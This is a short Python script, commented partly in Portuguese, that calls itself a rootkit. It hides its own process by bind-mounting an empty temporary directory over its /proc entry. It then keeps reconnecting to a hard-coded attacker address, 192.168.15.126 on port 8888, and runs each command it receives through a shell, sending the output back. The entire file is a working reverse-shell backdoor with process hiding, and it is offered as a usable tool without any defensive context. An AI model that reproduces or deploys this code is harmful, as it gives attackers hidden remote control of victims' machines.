#!/usr/bin/python
# -*- coding: utf-8 -*-
import os
import socket
import string
import subprocess
import time
import random as r

# Definindo as variáveis do computador do atacante
rhost = "192.168.15.126"
rport = 8888

# Função principal do rootkit - reverse shell
def remote_shell():
    # Strings to generate the temporary random process name from
    ch = string.ascii_uppercase + string.digits 
    token = "".join(r.choice(ch) for _ in range(5)) 
    pid = os.getpid() 
    # make bind mount on the current process folder in /proc to hide it 
    os.system("mkdir /tmp/{1} && mount -o bind /tmp/{1} /proc/{0}".format(pid, token))
    host = rhost
    port = rport 
    # print message (for debugging issues)
    print("[+] Rootkit is working now, check your connection  .. ") 
    
    def MakeConnection(h, p): 
        try: 
            # Reverse connection interval
            time.sleep(5) 
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((h, p))
            while True:
                command =  sock.recv(1024)
                # Exit if the attacker sent exit command
                if command.strip(b"\n") == b"exit":
                    # Close socket    
                    sock.close() 
                    break
                proc = subprocess.Popen(command, stdout=subprocess.PIPE , stderr=subprocess.PIPE , shell=True) # Execute the sent command
                proc_result = proc.stdout.read() + proc.stderr.read() 
                sock.send(proc_result) 
        except socket.error:
            pass  

    while True:
        MakeConnection(host, port)

